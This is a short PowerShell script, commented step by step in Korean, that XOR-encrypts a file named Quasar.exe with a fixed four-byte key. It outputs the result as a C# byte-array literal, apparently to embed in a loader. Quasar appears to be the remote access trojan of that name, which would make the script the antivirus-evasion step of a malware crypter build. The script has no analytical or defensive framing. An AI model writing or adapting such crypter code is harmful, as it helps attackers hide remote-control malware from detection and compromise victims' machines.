# 1. 입력 파일(원본 Quasar)과 출력될 텍스트 파일 경로를 변수에 저장합니다.
$inputFile = "C:\BuildWork\Quasar.exe"
$outputFile = "C:\BuildWork\Encrypted_Quasar.txt"

# 2. XOR 암호화에 사용할 비밀 바이트 키(Key)를 지정합니다. (0x5A, 0x1F, 0x3C, 0x7E)
$xorKey = [byte[]](0x5A, 0x1F, 0x3C, 0x7E)

# 3. 원본 바이너리 파일을 바이트(Byte) 데이터 배열 형태로 읽어옵니다.
$rawBytes = [System.IO.File]::ReadAllBytes($inputFile)

# 4. 암호화 결과를 담을 빈 바이트 배열 공간을 생성합니다.
$encryptedBytes = New-Object byte[] $rawBytes.Length

# 5. 반복문(Loop)을 돌며 원본 바이트와 키 바이트를 한 자릿수씩 XOR 연산합니다.
for ($i = 0; $i -lt $rawBytes.Length; $i++) { $encryptedBytes[$i] = $rawBytes[$i] -bxor $xorKey[$i % $xorKey.Length] }

# 6. 암호화된 바이트를 C# 코드 형태(0x8A, 0x4F, ...)의 문자열로 변환합니다.
$hexArray = $encryptedBytes | ForEach-Object { "0x{0:X2}" -f $_ }
$formattedOutput = "byte[] encryptedQuasar = new byte[] { " + ($hexArray -join ", ") + " };"

# 7. 변환된 C# 바이트 배열 텍스트를 파일로 저장합니다.
[System.IO.File]::WriteAllText($outputFile, $formattedOutput)
